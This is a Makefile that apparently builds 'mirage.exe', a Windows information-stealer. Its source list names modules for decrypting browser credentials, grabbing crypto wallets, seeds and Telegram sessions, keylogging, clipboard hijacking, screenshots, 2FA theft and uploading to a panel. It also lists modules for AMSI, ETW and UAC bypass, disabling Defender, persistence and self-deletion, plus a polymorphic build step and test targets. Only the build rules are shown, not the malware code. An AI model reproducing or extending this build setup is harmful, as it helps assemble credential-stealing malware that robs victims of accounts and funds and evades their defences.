CC = x86_64-w64-mingw32-gcc
NASM = nasm
CFLAGS = -Wall -Wextra -Wno-error -O2 -fdata-sections -ffunction-sections -Iinclude -Isrc -Isrc/rt -Isrc/utils -Isrc/parsers -Isrc/browsers -Isrc/wallets -Isrc/system -Isrc/network -Isrc/crypto -Isrc/evasion -Isrc/cleanup
LDFLAGS = -nostdlib -Wl,--gc-sections -Wl,-e,mainCRTStartup -Wl,--subsystem,windows

SRCS = src/main.c \
       src/rt/rt_startup.c \
       src/rt/rt_mem.c \
       src/rt/rt_str.c \
       src/rt/rt_conv.c \
       src/rt/rt_snprintf.c \
       src/rt/rt_file.c \
       src/types/peb.c \
       src/types/hash.c \
       src/types/export_resolve.c \
       src/syscalls/engine.c \
       src/browsers/chromium.c \
       src/browsers/firefox.c \
       src/browsers/browser_paths.c \
       src/wallets/wallets.c \
       src/wallets/wallet_ext.c \
       src/wallets/wallet_desktop.c \
       src/messengers/messengers.c \
       src/messengers/telegram_tdata.c \
       src/messengers/telegram_web.c \
       src/parsers/sqlite.c \
       src/network/socks5.c \
       src/network/panel_http.c \
       src/network/ws2.c \
       src/network/ws2_peb.c \
       src/network/proxy.c \
       src/network/chunked.c \
       src/network/schannel.c \
       src/system/system_info.c \
       src/system/clipboard.c \
       src/system/wifi.c \
       src/system/keylogger.c \
       src/system/screenshot.c \
       src/system/seed_grabber.c \
       src/system/grabber.c \
       src/system/inject.c \
       src/system/twofa.c \
       src/system/clipper.c \
       src/system/passman.c \
       src/system/gaming.c \
       src/system/vpn.c \
       src/crypto/chrome_crypto.c \
       src/crypto/firefox_crypto.c \
       src/crypto/chacha_poly.c \
       src/crypto/archive_crypt.c \
       src/crypto/dpapi.c \
       src/crypto/chrome_key.c \
       src/crypto/appbound.c \
       src/crypto/elevator.c \
       src/crypto/bcrypt_peb.c \
       src/crypto/com_peb.c \
       src/crypto/crypt32_peb.c \
       src/browsers/cdp_grabber.c \
       src/utils/base64.c \
       src/utils/file_utils.c \
       src/utils/secure_zero.c \
       src/evasion/anti_analysis.c \
       src/evasion/detection.c \
       src/evasion/evasion.c \
       src/evasion/amsi_bypass.c \
       src/evasion/etw_bypass.c \
       src/evasion/uac_bypass.c \
       src/evasion/peb_hide.c \
       src/evasion/defender_disable.c \
       src/evasion/mutex.c \
       src/cleanup/persistence.c \
       src/cleanup/self_delete.c \
       src/cleanup/temp_wipe.c

ASM_SRCS = asm/mirage_stubs_v2.asm

OBJ_DIR = build
OBJS = $(patsubst src/%.c, $(OBJ_DIR)/%.o, $(SRCS)) \
       $(patsubst asm/%.asm, $(OBJ_DIR)/asm/%.o, $(ASM_SRCS))
TARGET = mirage.exe

.PHONY: all clean test polymorph

all: polymorph $(TARGET)

polymorph:
	python tools/make_polymorphic.py

test: $(TARGET)
	./$(TARGET) --test

$(TARGET): $(OBJS)
	$(CC) -o $@ $(OBJS) $(LDFLAGS)
	strip --strip-all $@

$(OBJ_DIR)/%.o: src/%.c
	@mkdir -p $(dir $@)
	$(CC) $(CFLAGS) -c $< -o $@

$(OBJ_DIR)/asm/%.o: asm/%.asm
	@mkdir -p $(dir $@)
	$(NASM) -f win64 $< -o $@

clean:
	rm -rf $(OBJ_DIR) $(TARGET)

test-hash: tests/test_hash.c src/types/hash.c include/hash.h include/config.h
	$(CC) -Wall -Wextra -O2 -Iinclude -c src/types/hash.c -o src/types/hash.o
	$(CC) -Wall -Wextra -O2 -Iinclude -c tests/test_hash.c -o tests/test_hash.o
	$(CC) -o tests/test_hash tests/test_hash.o src/types/hash.o
	./tests/test_hash

# ── Unit tests (native gcc for Linux) ─────────────────────────
TEST_CC = gcc
TEST_CFLAGS = -Wall -Wextra -O2 -Iinclude -Isrc/parsers -std=c11

test-unit: test-crypto test-peb test-chromium test-wallets test-messengers test-network test-evasion
	@echo "=== ALL UNIT TESTS PASSED ==="

test-crypto: tests/test_crypto.c src/crypto/chacha_poly.c
	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_crypto tests/test_crypto.c src/crypto/chacha_poly.c
	./tests/test_crypto

test-sqlite: tests/test_sqlite.c src/parsers/sqlite.c
	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_sqlite tests/test_sqlite.c src/parsers/sqlite.c
	./tests/test_sqlite

test-peb: tests/test_peb.c
	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_peb tests/test_peb.c
	./tests/test_peb

test-chromium: tests/test_chromium.c src/browsers/browser_paths.c
	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_chromium tests/test_chromium.c src/browsers/browser_paths.c
	./tests/test_chromium

test-wallets: tests/test_wallets.c src/browsers/browser_paths.c
	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_wallets tests/test_wallets.c src/browsers/browser_paths.c
	./tests/test_wallets

test-messengers: tests/test_messengers.c
	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_messengers tests/test_messengers.c
	./tests/test_messengers

test-network: tests/test_network.c
	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_network tests/test_network.c
	./tests/test_network

test-evasion: tests/test_evasion.c
	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_evasion tests/test_evasion.c
	./tests/test_evasion

clean-tests:
	rm -f tests/test_crypto tests/test_sqlite tests/test_peb tests/test_chromium \
	      tests/test_wallets tests/test_messengers tests/test_network tests/test_evasion \
	      tests/*.o

test-e2e: tests/test_e2e.c
	$(CC) -Wall -Wextra -O2 -Iinclude -Isrc/parsers -Isrc/browsers -Isrc/wallets -Isrc/system -Isrc/network -o tests/test_e2e tests/test_e2e.c src/network/panel_http.c src/browsers/browser_paths.c src/browsers/chromium.c src/browsers/firefox.c src/wallets/wallets.c src/wallets/wallet_ext.c src/wallets/wallet_desktop.c src/messengers/messengers.c src/parsers/sqlite.c src/system/system_info.c src/system/wifi.c src/system/twofa.c src/crypto/chrome_crypto.c src/crypto/firefox_crypto.c src/crypto/chacha_poly.c src/crypto/archive_crypt.c src/crypto/dpapi.c src/crypto/chrome_key.c src/crypto/appbound.c src/evasion/anti_analysis.c src/evasion/detection.c src/evasion/evasion.c src/evasion/amsi_bypass.c src/evasion/etw_bypass.c src/evasion/uac_bypass.c src/evasion/peb_hide.c src/evasion/defender_disable.c src/evasion/mutex.c src/cleanup/persistence.c src/cleanup/self_delete.c src/cleanup/temp_wipe.c src/types/peb.c src/types/hash.c src/types/export_resolve.c src/syscalls/engine.c src/network/ws2.c src/network/proxy.c src/network/chunked.c src/network/schannel.c asm/mirage_stubs_v2.o -lws2_32 -lkernel32 -luser32 -ladvapi32 -lbcrypt -lcrypt32
